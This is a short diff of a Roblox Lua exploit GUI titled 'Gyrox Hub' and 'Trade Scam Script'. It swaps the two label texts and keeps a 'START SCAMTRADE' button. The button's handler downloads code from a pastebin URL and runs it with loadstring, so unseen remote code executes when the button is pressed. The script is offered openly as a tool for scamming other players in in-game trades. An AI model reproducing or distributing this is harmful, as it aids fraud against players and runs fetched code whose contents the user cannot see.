@@ -29,7 +29,7 @@ TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel.BorderSizePixel = 0
 TextLabel.Size = UDim2.new(0, 275, 0, 47)
 TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "Gyrox Hub"
+TextLabel.Text = "Trade Scam Script"
 TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel.TextSize = 30.000
  
@@ -40,7 +40,7 @@ TextLabel_2.BorderSizePixel = 0
 TextLabel_2.Position = UDim2.new(0, 0, 0.764192164, 0)
 TextLabel_2.Size = UDim2.new(0, 275, 0, 54)
 TextLabel_2.Font = Enum.Font.SourceSans
-TextLabel_2.Text = "SCAM TRADE SCRIPT"
+TextLabel_2.Text = "Gyrox Hub"
 TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextLabel_2.TextSize = 27.000
  
@@ -54,6 +54,5 @@ TextButton.Font = Enum.Font.SourceSans
 TextButton.Text = "START SCAMTRADE"
 TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton.TextSize = 30.000
-TextButton.MouseButton1Down:connect(function()
-loadstring(game:HttpGet('https://pastebin.com/raw/mqPz1Xz1'))()
+TextButton.MouseButton1Down:connect(function() loadstring(game:HttpGet('https://pastebin.com/raw/mqPz1Xz1'))()
 end)
